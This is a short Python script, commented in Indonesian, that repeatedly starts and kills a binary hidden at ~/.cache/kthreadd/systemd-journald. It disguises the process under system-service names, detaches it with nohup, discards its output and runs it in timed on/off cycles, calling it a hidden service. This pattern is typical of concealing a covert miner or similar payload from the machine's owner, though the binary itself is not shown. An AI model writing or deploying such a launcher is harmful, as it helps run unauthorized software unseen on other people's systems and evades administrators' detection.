import os
import time
import sys
import signal

# CONFIG
APP_PATH = os.path.expanduser("~/.cache/kthreadd/systemd-journald")  # Lokasi program
APP_NAME = "systemd-journald"  # Nama proses buat kill
RUNTIME = 1200  # 20 menit
BREAKTIME = 300  # 5 menit
LONG_BREAK = 600  # 10 menit
CYCLES = 10  # Jumlah siklus sebelum istirahat panjang

def stop_app():
    """Hentikan proses background."""
    os.system(f"pkill -f {APP_NAME}")
    print("🛑 Background service dihentikan...")

def start_app():
    """Jalankan proses background."""
    print("▶️ Menjalankan service tersembunyi...")
    command = f"nohup bash -c '{APP_PATH}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        print("⚙️ Mulai siklus tugas otomatis...")
        for i in range(CYCLES):
            print(f"🔁 Siklus ke-{i+1}")
            start_app()
            time.sleep(RUNTIME)
            stop_app()
            print(f"⏸️ Istirahat {BREAKTIME // 60} menit...")
            time.sleep(BREAKTIME)
        
        print(f"⏲️ Waktunya istirahat panjang {LONG_BREAK // 60} menit...")
        time.sleep(LONG_BREAK)

def sigint_handler(sig, frame):
    """Hentikan service kalau dihentikan manual."""
    print("📴 Service dihentikan manual...")
    stop_app()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
